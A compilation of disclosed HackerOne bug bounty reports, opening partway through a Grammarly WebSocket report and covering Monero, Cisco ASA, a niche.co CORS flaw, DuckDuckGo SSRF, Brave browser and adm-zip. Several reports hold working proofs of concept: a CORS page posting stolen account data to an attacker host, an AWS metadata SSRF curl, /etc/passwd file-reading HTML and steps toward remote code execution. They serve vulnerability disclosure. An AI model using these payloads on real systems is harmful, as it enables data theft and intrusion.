#### `wss://dox.grammarly.com` origin

1. Click "Connect to dox.grammarly.com from page origin" -> see 403 error in console
2. Click "Connect to dox.grammarly.com from extension"
3. Check "Network" tab in background page's devtools
4. Connection to `dox.grammarly.com` origin was established.

## Supporting Material/References:

Screencast for `localhost:8080` and `ws://dox.grammarly.com` attached.

## Impact

### "connect" + "send" to any origin
Attacker could connect and send data to any WS endpoint from extension origin.
It's not as impactful as #389108 by itself, because of WS policies.

### "connect" + "send" to Grammarly's endpoints
As of Grammarly's WS APIs allows connections from Grammarly extension origin, attacker could send arbitrary data with user's credentials to:
1. `wss://dox.grammarly.com/`
2. `wss://capi.grammarly.com/`
3. And other Grammarly WS endpoints (and Grammarly extension origin "friendly" endpoints, if any)

Example of impactful WS connection: `wss://dox.grammarly.com/documents/<document_id>/ws` - allows editing document with `<document_id>`

### Response handling
As a bonus, it's possible to connect to attacker's WS endpoint, receive data and handle received commands in background page and content script. No PoC or possible exploitation, however, that's potentially a bad behavior.

> I hope Grammarly team could imagine the effort I put into this research :( 
> Set "High" impact, because of arbitrary WS connection + handling of commands received from attacker's server.

---

### [Locked_Transfer functional burning](https://hackerone.com/reports/417515)

- **Report ID:** `417515`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Monero
- **Reporter:** @keejef
- **Bounty:** - usd
- **Disclosed:** 2019-07-09T21:46:20.520Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** Using the `locked_transfer` command in the monero-wallet-cli users can send outputs with high lock times like 1,000,000 blocks. A vendor will accept these transactions with no warnings and credit a user balance. The user can now withdrawal or sell this balance and the vendor is left with outputs that will not unlock for 1000s of years.

**Description:** 

This bug essentially exploits the use of the `show_transfers` command by vendors that credit balances, functionally the result is the same as the double output bug found a week [ago](https://github.com/monero-project/monero/pull/4438). It is presumed at this point that anything in the Cryptonote/ Monero protocol that can show a valid transfer in `show_transfers` will be accepted by vendors, even if it creates un-spendable or functionality un-spendable outputs.

## Releases Affected:

  *  0.12.3.0 Lithium Luna - All Operating Systems 
  *  Current Monero master 

This will also affect all Cryptonote coins with `locked_transfer` and exchanges that use `show_transfers`

## Steps To Reproduce:

  1. Transfer Monero or other Cryptonote coin to wallet-cli 
  2. Use `locked_transfer` set a high amount lockblocks, send to exchange or other vendor that will credit your balance.
  3. Sell, or withdrawal your currency on the exchange, leaving them with locked coins, the attacker only loses the minimal fee that the exchange charges, while the exchange is left with un-spendable coins. 

This bug has been tested against two separate exchanges with very small amounts of Monero, that will unlock after 4 months. This method will likely be effective against all exchanges that use `show_transfers` as a method of auditing incoming transactions (which i think is nearly all of them).  

P.S. Discovery of bugs like these would not be possible without the help of my coworkers at Loki, so i want to thank them for their help brainstorming on this one.

## Impact

This bug cannot be used to create new Monero but it can be used to attack Monero vendors with coins they can functionally never spend.

---

### [Remote P2P DoS](https://hackerone.com/reports/592200)

- **Report ID:** `592200`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Monero
- **Reporter:** @padillac
- **Bounty:** - usd
- **Disclosed:** 2019-07-03T00:11:49.020Z
- **CVE(s):** -

**Summary (team):**

Remote P2P DoS resolved.

**Summary (researcher):**

https://www.activism.net/cypherpunk/manifesto.html

---

### [CVE-2018-0296](https://hackerone.com/reports/377542)

- **Report ID:** `377542`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** VK.com
- **Reporter:** @linkks
- **Bounty:** - usd
- **Disclosed:** 2019-06-17T22:05:30.319Z
- **CVE(s):** CVE-2018-0296

**Summary (team):**

Path traversal.

---

### [Cisco ASA Denial of Service & Path Traversal (CVE-2018-0296)](https://hackerone.com/reports/378698)

- **Report ID:** `378698`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** ok.ru
- **Reporter:** @linkks
- **Bounty:** - usd
- **Disclosed:** 2019-05-20T18:38:24.715Z
- **CVE(s):** CVE-2018-0296

**Summary (team):**

Unpatched CVE-2018-0296 in test Cisco ASA instance (enter-test.odkl.ru)

---

### [UBNT Amplification DDOS Attack](https://hackerone.com/reports/221625)

- **Report ID:** `221625`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Ubiquiti Inc.
- **Reporter:** @csiete
- **Bounty:** - usd
- **Disclosed:** 2019-02-06T20:33:10.015Z
- **CVE(s):** -

**Summary (team):**

Denial of Service attack in airMAX prior to 8.3.2 , airMAX prior to 6.0.7 and EdgeMAX prior to 1.9.7 allow attackers to use the Discovery Protocol in amplification attacks.

---

### [HTTP PUT method is enabled ratelimited.me](https://hackerone.com/reports/487656)

- **Report ID:** `487656`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** RATELIMITED
- **Reporter:** @codeslayer1337
- **Bounty:** - usd
- **Disclosed:** 2019-01-29T16:09:10.947Z
- **CVE(s):** -

**Vulnerability Information:**

Found on HTTP PUT sites enabled on web servers. I tried testing to write the file / codelayer137.txt uploaded to the server using the PUT verb, and the contents of the file were then taken using the GET verb. the following is POC

Request:
PUT /codeslayer137.txt HTTP/1.1
Host: ratelimited.me
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: id,en-US;q=0.7,en;q=0.3
Connection: close
Cookie: __cfduid=dfa5166b2ed63c2a5078df85a46ec5e941548497323; fs_uid=rs.fullstory.com`HCE07`5768820354449408:5743114304094208; cookieconsent_status=dismiss; mp_9e50b60442d3361880f79100f15e5aac_mixpanel=%7B%22distinct_id%22%3A%20%2216889a21237498-0766105008d6a5-12666d4a-e1000-16889a212387c%22%2C%22%24device_id%22%3A%20%2216889a21237498-0766105008d6a5-12666d4a-e1000-16889a212387c%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D
Upgrade-Insecure-Requests: 1
If-Modified-Since: Sun, 27 Jan 2019 00:07:53 GMT
Content-Length: 21

Testing CodeSlayer137


Response:
HTTP/1.1 200 OK
Date: Tue, 29 Jan 2019 08:24:15 GMT
Content-Type: text/plain
Content-Length: 0
Connection: close
Accept-Ranges: bytes
Content-Security-Policy: block-all-mixed-content
Etag: "be3b22647a7d52f2f662109652e629fc"
Vary: Origin
X-Amz-Request-Id: 157E4426C0B3D211
X-Minio-Deployment-Id: ebc7a0d8-9f47-4bdb-92ee-4a9cbbd3ec48
X-Xss-Protection: 1; mode=block
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 4a0a4d20791f31a4-SIN

## Impact

The HTTP PUT method is normally used to upload data that is saved on the server at a user-supplied URL. If enabled, an attacker may be able to place arbitrary, and potentially malicious, content into the application. Depending on the server's configuration, this may lead to compromise of other users (by uploading client-executable scripts), compromise of the server (by uploading server-executable code), or other attacks.

---

### [User account blocking by Internal Server error](https://hackerone.com/reports/451052)

- **Report ID:** `451052`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Infogram
- **Reporter:** @marataziat
- **Bounty:** - usd
- **Disclosed:** 2018-12-28T14:45:39.029Z
- **CVE(s):** -

**Vulnerability Information:**

If you send a language[]=en in https://infogram.com/api/users/me user be forever get an Internal Server error ( EVEN AFTER re-logining):
https://youtu.be/AxYa11lEiWA
(I idk why does hackerone can't upload this video so I uploaded this video privately to the youtube!) 
In this video, I'm trying to relogin to the my another account that also was exploited by this vulnerability and I'm getting the same error! https://youtu.be/1mihr5_oe3s 

It's like a permanent ban! And if that can be exploited by CSRF it becomes more dangerous because the user can just go to some page like inex.html (F381888)! I don't know if it is 100% possible to exploit by CSRF because I have blocked all my two accounts by using this issue! But the browser network tools shows that it's possible to exploit it by CSRF here the video https://youtu.be/5TliXljf4V4 !

## Impact

An attacker can permanently ban any user by exploiting this vulnerability using CSRF!

---

### [Долгоживущий хеш + получение частичного доступа к аккаунту после сброса сессии](https://hackerone.com/reports/363809)

- **Report ID:** `363809`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** VK.com
- **Reporter:** @executor
- **Bounty:** 500 usd
- **Disclosed:** 2018-12-12T14:54:53.062Z
- **CVE(s):** -

**Summary (team):**

Hash lifetime.

---

### [CORS misconfig | Account Takeover](https://hackerone.com/reports/426147)

- **Report ID:** `426147`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** X / xAI
- **Reporter:** @nahoragg
- **Bounty:** - usd
- **Disclosed:** 2018-12-10T18:28:33.696Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 
CORS misconfig is found on niche.co as Access-Control-Allow-Origin is dynamically fetched from client Origin header with **credential true** and **different methods are enabled** as well.

**Description:**
Basically, the application was only checking whether "//niche.co" was in the Origin header, that means i can give anything containing that. For ex : "https://niche.co.evil.net", "https://niche.com", i can even change the protocol like http, ftp, file etc. F363563: cors_1.png

## Steps To Reproduce:
Exploit:
Host this code on a domain(http://niche.co.evil.net) or any other that contains "//niche.co".
```
<html>
<body>
<button type='button' onclick='cors()'>CORS</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from niche.co about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://evil.cors.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://www.niche.co/api/v1/users/*******", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```
As soon as victim visit this malicious page, his details will be fetched from his current session and sent to attacker's domain where it can be logged or saved. F363586: cors_3.png F363564: cors_2.png

## How to fix

Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.

## Supporting Material/References:

https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
https://ejj.io/misconfigured-cors/

## Impact

Using this misconfig, attacker can do many actions depending on the functionality of application which in this case use **API** and do activities like:
1) Read, Update, Delete Users information(Email,Location,Bio etc)
2) Stealing Authenticity_token(CSRF) 
3) Delete social accounts on niche
4) **View private posts of social accounts**
5) Close account
6) Logout etc.

---

### [Prototype Pollution Vulnerability in mpath Package](https://hackerone.com/reports/390860)

- **Report ID:** `390860`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Node.js third-party modules
- **Reporter:** @cris_semmle
- **Bounty:** - usd
- **Disclosed:** 2018-11-30T06:21:32.425Z
- **CVE(s):** CVE-2018-16490

**Vulnerability Information:**

I would like to report prototype pollution vulnerability in mpath.
It allows an attacker to inject arbitrary properties on Object.prototype.

# Module

**module name:** mpath
**version:** 0.4.1
**npm page:** `https://www.npmjs.com/package/mpath`

## Module Description

{G,S}et javascript object values using MongoDB-like path notatio

## Module Stats

305,874 downloads in the last week

# Vulnerability

## Vulnerability Description

An attacker can specify a path that include the prototype object, and thus overwrite important properties on Object.prototype or add new ones.

## Steps To Reproduce:

```js
var mpath = require("mpath");
var obj = {
    comments: [
        { title: 'funny' },
        { title: 'exciting!' }
    ]
}
mpath.set('__proto__.x', ['hilarious', 'fruity'], obj);
console.log({}.x); 
```

## Patch

N/A validate property names before overwriting them and prevent write to certain paths.


# Wrap up

- I contacted the maintainer to let them know: [N
- I opened an issue in the related repository: N

## Impact

This may be an intended behaviour of this module, but it needs to be better documented. Moreover, to properly analyse the impact of this vulnerability one must look at the clients of this module, such as mongoose and see if attackers can realistically control the path value.

---

### [Accidental Access to Programs Information via SAML Login](https://hackerone.com/reports/438306)

- **Report ID:** `438306`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** HackerOne
- **Reporter:** @npbhatter17
- **Bounty:** - usd
- **Disclosed:** 2018-11-14T18:24:09.268Z
- **CVE(s):** -

**Summary (team):**

On November 8th, 2018, HackerOne released software to production that contained a bug which impacted our Security Assertion Markup Language (SAML) authentication system. As a result of the bug, the SAML JIT (Just-In-Time) provisioning mechanism granted users of one customer program read-only access to another customer program. Users who signed in after the software code was pushed into production were inadvertently added as users to 12 other customer programs. The scope of this faulty software behavior was 12 customer programs and 34 user accounts of customers.

# Timeline

| **Date**   | **Time (PST)** | **Action**                                                              |
|------------|----------------|-------------------------------------------------------------------------|
| 2018-11-08 | 12:48 PM       | Software containing bug deployed to production                      |
| 2018-11-08 | 1:08 PM        | HackerOne’s engineering team is informed of unexpected program memberships |
| 2018-11-08 | 1:17 PM        | SAML JIT provisioning disabled for all customers                        |
| 2018-11-08 | 1:31 PM        | HackerOne maintenance mode enabled, disabling all unauthorized access   |
| 2018-11-08 | 1:51 PM        | Unauthorized program memberships removed                                |
| 2018-11-08 | 2:52 PM        | HackerOne restored to normal functionality                              |
| 2018-11-08 | 10:00 PM        | All customers and users involved are notified of the incident           |

# Impacted Data
Between 12:48 PM and 1:31 PM PST on November 8th, 2018, 34 employees of HackerOne customers had access to certain program details in one or more programs other than their own. A total of 12 customer programs and 34 customer user accounts were involved.

During that time, the users had read-only permissions which gave them access to reports (titles, vulnerability information) as well as some program details, such as common responses and dashboards. Seven programs had vulnerability reports viewed by unauthorized employees. Four programs had their inboxes viewed, which disclosed report states, titles, issue tracker references, reporter, assignee, and when the report was last updated. However, for those four programs, no vulnerability descriptions were accessed. One impacted program had no data accessed at all. Impacted customers were notified as to what pieces of data were accessed.

Customers’ employees were also impacted. There were 34 customer usernames and email addresses that were shared with other customers without their authorization as they were added to customer programs. These individuals were notified regarding this unintended access.

**If your data was accessed during this incident, you have received a separate notification from HackerOne.**

# Root Cause
A refactor of the SAML JIT provisioning code path incorrectly scoped a data query that resulted in returning the affected programs. When a user authenticated via SAML after the software containing the bug was released, they were immediately added to at least one of the affected programs. The user was not assigned to any permission groups within the program, giving them the default “read-only” access that allows them to view program details, reports and make internal comments.

# Resolution and Recovery
At 1:08 PM PST, the engineering on-call duty was notified of unexpected users being added to programs. At that time an incident response team identified that a release at 12:48 PM PST included a change to SAML JIT provisioning. At 1:17 PM PST, the team decided to disable the SAML JIT provisioning system to reduce the impact of the issue.

By 1:31 PM PST, the incident team decided to put production into maintenance mode in order to safely investigate the extent of the unauthorized access. HackerOne customers that signed in after the code release were inadvertently added to 12 other programs. A total of 34 customer user accounts were involved, and each was added to the 12 programs impacted. At 1:51 PM PST, all changes as a result of the bug were reverted.

Before restoring full functionality, the incident team investigated the extent of the impact to identify what unauthorized access occurred as well as what personal user data was exposed. Once the investigation was complete, the site was restored to full functionality at 2:52 PM PST. At this time, SAML JIT provisioning is disabled until the feature has undergone a further review.

This was not eligible for a bounty, as the HackerOne team was first to identify the issue.

# Preventative Measures 
As part of our incident response process, we are conducting an internal review and analysis of the incident. We are taking the following actions to address the underlying causes of issues and to help prevent future occurrence:

 - Improve our staging environment to include SAML JIT provisioned programs to more closely mirror our production environment, so we can identify similar bugs before release
 - Improve our database schema to limit the reach of queries executed by the system
 - Improve data access logging to identify affected parties in a more efficient and timely manner in the future
 - Improve model-level validations to include additional business logic rules that would prevent edge cases that cannot be hit through normal application usage
 - Increase our positive as well as negative path testing in both integration and acceptance tests

---

### [SSRF vulnerability on proxy.duckduckgo.com (access to metadata server on AWS)](https://hackerone.com/reports/395521)

- **Report ID:** `395521`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** DuckDuckGo
- **Reporter:** @cujanovic
- **Bounty:** - usd
- **Disclosed:** 2018-10-31T17:33:34.738Z
- **CVE(s):** -

**Vulnerability Information:**

Hello, I saw that SSRF on proxy.duckduckgo.com is out of scope but because of the severity I wanted to report this.
The payload is simple: 
```curl "https://proxy.duckduckgo.com/iur/?f=1&image_host=http://169.254.169.254/latest/meta-data/"```

Response from the server:
```ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
hostname
instance-action
instance-id
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/```

## Impact

access information on internal AWS metadata server.

---

### [RCE: DnDing shortcut files to chrome://brave allows loading HTML files in Muon's context](https://hackerone.com/reports/415258)

- **Report ID:** `415258`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Brave Software
- **Reporter:** @metnew
- **Bounty:** - usd
- **Disclosed:** 2018-10-22T20:12:43.978Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

> \#395737 has shown that Brave supports `chrome://brave/<local_file>` URLs.
> The Brave team introduced a patch which blocks navigation to `chrome://brave` and removed `chrome.remote.require` to prevent command execution on the machine.

### Navigation to `chrome://brave` via shortcut files

> ~~From my understanding:~~

1. Brave allows DnDing files
2. DnD of shortcut files is handled on Chromium-level (shortcut files : e.g., `.webloc` on macOS or `.desktop` on Linux) 
3. DnDing a shortcut => navigation to URL the file points to.

This approach allows navigating to `chrome://brave/` origin.

#### Attack requirements

- The victim has to dnd a shortcut file to a tab
- Attacker needs **MITM** OR **local reflected XSS** OR an attacker-supplied **HTML file which absolute path** is known.

> MITM is the easiest way so far.

### Local files reading

Yeah, reading local files from `chrome://brave` is possible.
The same PoC as in #390362, but the origin is `chrome://brave`:

``` html
<head>
    <!-- Local files reading -->
    <script>
        function show() {
            var file = link.import.querySelector('body')
            alert(file.innerHTML)
        }
    </script>
    <link id="link" onload="show()" rel="import" as="document" href="chrome://brave/etc/passwd">
</head>
```

### `ipcRender` and `ipcMain`

HTML file loaded in `chrome://brave/` context has access to private APIs, like `ipcRenderer` and `ipcMain`:

``` js
let ipcMain = chrome.remote.getBuiltin('ipcMain')
let ipcRenderer = chrome.ipcRenderer
```

Sending arbitrary IPC commands -> full control over the browser.
**RCE through arbitrary IPC commands:** #188086 (includes PoC)

Impact: UXSS, URL spoofing, changing browser settings, etc.

### `chrome.remote.getBuiltin(module)`

Sending arbitrary IPC commands is a serious problem, but the impact isn't limited to it.

`chrome.remote.getBuiltin(module)` returns `electron[module]`.
``` js
// Alias to remote.require('electron').xxx.
binding.getBuiltin = function (module) {
  return metaToValue(ipcRenderer.sendSync('ELECTRON_BROWSER_GET_BUILTIN', module))
}
```

It's possible to leverage this func to obtain some "hidden" modules like `autoUpdater`, `Tray`, `protocol` and other.

#### Running attacker's executables on machine (download `.terminal` via IPC + <lack-of-quarantine> + `chrome.shell.openExternal`)

IPC allows doing many damaging things and possibly running shell commands too.

But there is an alternative way for an RCE:
1. IPC downloads a `.terminal` file from the web
2. #374106 - `.terminal` files could execute shell commands without `-x` permission
3. `chrome.remote.shell.openExternal` opens downloaded `.terminal` file
4. Commands from `.terminal` get executed

> No PoC provided, since the impact is already apparent, but could make it if required

#### Persistence

I'm sure, it's clear for the Brave team that it allows an attacker to persist on the device via changing browser settings.
However, I want to highlight that `chrome.remote.getBuiltin(module)` allows accessing `protocol` module, which allows:

```js
registerBufferProtocol: (...)
registerHttpProtocol: (...)
registerNavigatorHandler: (...)
registerServiceWorkerSchemes: ƒ ()
registerStandardSchemes: (...)
registerStringProtocol: ƒ ()
```

### MITM in Brave

- `chrome://brave` is always vulnerable to MITM even when HTTPSE is active
- `file://` is vulnerable to MITM, when HTTPSE is inactive

> Not sure whether HTTPSE is turned on by default.
> As far as I know, HTTPS Everywhere isn't enabled by default.

## Products affected: 

Brave: 0.24.0 
V8: 6.9.427.23 
rev: f657f15bf7e0e0c50a2b854c6b05edb59bfc556c 
Muon: 8.1.6 
OS Release: 17.7.0 
Update Channel: Release 
OS Architecture: x64 
OS Platform: macOS 
Node.js: 7.9.0 
Brave Sync: v1.4.2 
libchromiumcontent: 69.0.3497.100

## Steps To Reproduce:

### PoC for shortcut navigation

1. Open any page in Brave
2. DnD `etc-passwd.webloc` file to Brave
3. Brave opens `chrome://brave/etc/passwd` showing `/etc/passwd` file in `chrome://brave` origin's context

### Exploit (macOS)

-1. Make sure to stop `httpd` on macOS
0. Insert next line into your `/etc/hosts`: `127.0.0.1 maps.googleapis.com`
1. `sudo node server.js` - starts MITM server
2. Open any page in Brave
3. DnD `exploit.webloc` file
4. Opened page shows an alert with `/etc/passwd` contents + working `<webview>` tag  + starts `Calculator.app`

## Supporting Material/References:

Screencast attached.

## Impact

A remote attacker with a MITM access (or specific conditions like reflected XSS on `file:///` origin) could send arbitrary IPC commands(trigger RCE) when a user drag-n-drops 
crafted shortcut file into Brave.

---

### [Local files reading using `link[rel="import"]`](https://hackerone.com/reports/375329)

- **Report ID:** `375329`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Brave Software
- **Reporter:** @metnew
- **Bounty:** - usd
- **Disclosed:** 2018-09-29T00:16:24.191Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

HTML file could import another file using `<link rel="import">`.  Brave returns `Access-Control-Allow-Origin: *` response header for local HTML files. That leads to local files reading.

> This vulnerability makes #369218 critical.

## Products affected: 

Brave: 0.23.19 
V8: 6.7.288.46 
rev: 178c3fbc045a0cbdbe098db08307503cce952081 
Muon: 7.1.3 
OS Release: 17.6.0 
Update Channel: Release 
OS Architecture: x64 
OS Platform: macOS 
Node.js: 7.9.0 
Brave Sync: v1.4.2 
libchromiumcontent: 67.0.3396.87

## Steps To Reproduce:

PoC:
``` html
<head>
    <script>
        function show() {
            var file = link.import.querySelector('body')
            alert(file.innerHTML)
        }
    </script>
    <link id="link" href="file:///etc/passwd" rel="import" as="document" onload="show()" />
</head>
```

## Supporting Material/References:

Screencast + PoC attached.

## Impact

Local files reading is forbidden in any browser.
Also, note that this vulnerability makes  #369218 critical.

> Probably all platforms(macOS/Win/Linux) are affected.

---

### [Local files reading from the "file://" origin through `brave://`](https://hackerone.com/reports/390362)

- **Report ID:** `390362`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Brave Software
- **Reporter:** @metnew
- **Bounty:** - usd
- **Disclosed:** 2018-09-29T00:15:51.923Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

Sadly, fix for #390013 works only for web. Loading `brave://` from the `file://` origin allows reading local files on the device.

> I said that fix could be insufficient 😈

`file://` and `brave://` both are local origins. That means it's possible to access `brave://` from `file://` and vice versa.

## Products affected: 

Brave: 0.23.77 
V8: 6.8.275.24 
rev: 0125b5f5ddc7eebc832ceeb4f4275230ec49d149 
Muon: 8.0.6 
OS Release: 17.7.0 
Update Channel: Релиз 
OS Architecture: x64 
OS Platform: macOS 
Node.js: 7.9.0 
Brave Sync: v1.4.2 
libchromiumcontent: 68.0.3440.84

## Steps To Reproduce:

```html
<head>
    <script>
        function show() {
            var file = link.import.querySelector('body')
            alert(file.innerHTML)
        }
    </script>
    <link id="link" href="brave:///etc/passwd" rel="import" as="document" onload="show()" />
</head>
```
## Supporting Material/References:

Screencast + PoC attached.

## Impact

Local files reading should be denied.

---

### [`chrome://brave` available for navigation in Release build [-> RCE] + navigation to `chrome://*` using tab_helper ["Open in new tab"]](https://hackerone.com/reports/395737)

- **Report ID:** `395737`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Brave Software
- **Reporter:** @metnew
- **Bounty:** - usd
- **Disclosed:** 2018-09-25T00:23:34.580Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

### `chrome://brave` is available for navigation

Navigation to `chrome://brave` + `<local_file_path>` requires local file at `<local_file_path>`.

The file loaded in this context has access to **private Muon APIs** such as `chrome.ipcRenderer/remote/webFrame/webViewRequest`.

Muon API allows executing code on the device. (e.g. with `chrome.remote.require('child_process').exec`)

> In addition, Brave isn't sandboxed (on all OS).

That's clearly a vulnerability, not a feature:
1. it's in Release channel, not in Debug builds
2. Could lead to RCE

> Note: attacker knows the correct `<local_file_path>` after loading the file from `file://` origin (`window.location.pathname`).

### Navigation to `chrome://brave`

I've already shown the way to navigate to `file://` URLs in  #369218, which was fixed in 0.23.80.

>  I mentioned in the report that it's possible navigating to `chrome://` URLs too in #369218. However, [the fix](https://github.com/brave/browser-laptop/pull/14973) was incomplete. It only works for `about:` and `file:`URLs.

### PoC

1. Shows that `<webview>` works
2. Launches `Calculator.app` on macOS

## Products affected: 
 
Brave: 0.23.79 (0.23.80 and 0.23.100 too, where #369218 is patched)
V8: 6.8.275.24 
rev: 51b49051a779f0db94fbcfd0df5faca781299ea0 
Muon: 8.0.7 
OS Release: 17.7.0 
Update Channel: Release 
OS Architecture: x64 
OS Platform: macOS 
Node.js: 7.9.0 
Brave Sync: v1.4.2 
libchromiumcontent: 68.0.3440.84

## Steps To Reproduce ||  Attack Scenario:

1. Download `exploit.html`
2. Open link in the file using "Open in new tab"
3. The new tab opens with private `<webview>` tag + `Calculator.app` starts

## Patch

Preventing navigation to `chrome://brave` origin seems ok.

### Additional resources

Screencast attached.

## Impact

Crafted HTML file allows executing code on the device. 

> Requires user gesture - "Open in a new tab". Set impact to "High", because requires downloading the file.

---

### [Local files reading from the web using `brave://`](https://hackerone.com/reports/390013)

- **Report ID:** `390013`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Brave Software
- **Reporter:** @metnew
- **Bounty:** - usd
- **Disclosed:** 2018-09-25T00:05:47.401Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

`brave://` protocol was introduced as a replacement for `AsarProtocolHandler`(or something like that) in `brave/muon` after #375329. 

However, fix for #375329 introduced a new much severe bug that allows reading files from a user's device from the web.

PoC is similar to #375329, but it uses `brave://` instead of `file://`:
```
<head>
    <script>
        function show() {
            var file = link.import.querySelector('body')
            alert(file.innerHTML)
        }
    </script>
    <link id="link" href="brave:///etc/passwd" rel="import" as="document" onload="show()" />
</head>
```

## Products affected: 

Brave: 0.23.73 
V8: 6.8.275.24 
rev: 50bdb6df42550dd14f5636770ec8585aa26e361b 
Muon: 8.0.3 
OS Release: 17.7.0 
Update Channel: Release 
OS Architecture: x64 
OS Platform: macOS 
Node.js: 7.9.0 
Brave Sync: v1.4.2 
libchromiumcontent: 68.0.3440.75

## Steps To Reproduce:

1. Open `exploit.html` from the web
2. Page alerts contents of `file:///etc/passwd`

## Supporting Material

Screencast attached.

## Impact

Reading local files from the web is a critical vulnerability.
I'm investigating this issue more detailed now, maybe impact is much severe than reading local files.

---

### [IDOR to view User Order Information](https://hackerone.com/reports/287789)

- **Report ID:** `287789`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** BOHEMIA INTERACTIVE a.s.
- **Reporter:** @meals
- **Bounty:** - usd
- **Disclosed:** 2018-09-17T15:33:04.833Z
- **CVE(s):** -

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!


**Description:** There is an idor to view other user's order information and determine their IP addresses and other order infromation

## Application & Version:

https://store.bistudio.com/order/1003793?confirmed=true

## Steps To Reproduce:
1. Login to your account
2. Visit the above endpoint
3. You can iterate through the order ID to view other users details.

## Supporting Material/References:

{F237085}
{F237086}

---

### [Reflected XSS on Partners Subdomain](https://hackerone.com/reports/390181)

- **Report ID:** `390181`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Uber
- **Reporter:** @mefkan
- **Bounty:** 2000 usd
- **Disclosed:** 2018-09-16T19:19:10.980Z
- **CVE(s):** -

**Summary (team):**

There was a reflected cross site scripting vulnerability at https://partners.uber.com/. By providing a specifically crafted value, it was possible for an attacker to inject malicious content into the partners.uber.com site, which would then be executed when the site is loaded. 

We enjoyed working with @mefkan on this issue and look forward to their next submission to our program.

**Summary (researcher):**

I will publish my blog in a few days :) Check out my twitter !  https://twitter.com/mefkansec

And here it is...

https://medium.com/@efkan162/how-i-xssed-uber-and-bypassed-csp-9ae52404f4c5

---

### [Arbitrary File Write Through Archive Extraction](https://hackerone.com/reports/362118)

- **Report ID:** `362118`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Node.js third-party modules
- **Reporter:** @danny_grander
- **Bounty:** - usd
- **Disclosed:** 2018-08-12T14:46:51.027Z
- **CVE(s):** CVE-2018-1002204

**Vulnerability Information:**

I would like to report arbitrary file write vulnerability in adm-zip module
It allows attackers to write arbitrary files when a malicious archive is extracted.
More info here: 
https://snyk.io/research/zip-slip-vulnerability
https://github.com/snyk/zip-slip-vulnerability#affected-libraries


# Module

**module name:** adm-zip
**version:** <0.4.9
**npm page:** `https://www.npmjs.com/package/adm-zip`

## Module Description
ADM-ZIP for NodeJS with added support for electron original-fs
ADM-ZIP is a pure JavaScript implementation for zip data compression for NodeJS.

## Module Stats

> Replace stats below with numbers from npm’s module page:

1.5M downloads in the last week

# Vulnerability

## Vulnerability Description
The vulnerability is a form of directory traversal that can be exploited by extracting files from an archive. The premise of the directory traversal vulnerability is that an attacker can gain access to parts of the file system outside of the target folder in which they should reside. The attacker can then overwrite executable files and either invoke them remotely or wait for the system or user to call them, thus achieving remote command execution on the victim’s machine. The vulnerability can also cause damage by overwriting configuration files or other sensitive resources, and can be exploited on both client (user) machines and servers.

The vulnerability is exploited using a specially crafted archive that holds directory traversal filenames (e.g.  ../../evil.sh). The Zip Slip vulnerability can affect numerous archive formats, including tar, jar, war,  cpio, apk, rar and 7z. If you’d like the information on this page in a downloadable technical white paper, click the button below.

More info here: 
https://snyk.io/research/zip-slip-vulnerability
https://github.com/snyk/zip-slip-vulnerability


## Steps To Reproduce:

Sample files can be found here: https://github.com/snyk/zip-slip-vulnerability/tree/master/archives


## Patch

Vulnerability is already fixed in ver 0.4.9.
We opened a fix PR on 23rd of April, https://github.com/cthackers/adm-zip/pull/212

CVE id for the vuln was assigned: CVE-2018-1002204

## Supporting Material/References:

There are multiple libraries affected, across different ecosystems. 
Full list here: https://github.com/snyk/zip-slip-vulnerability#affected-libraries

https://snyk.io/research/zip-slip-vulnerability
https://github.com/snyk/zip-slip-vulnerability

# Wrap up

- I contacted the maintainer to let them know: Y, and helped fix the issue
- I opened an issue in the related repository: N

## Impact

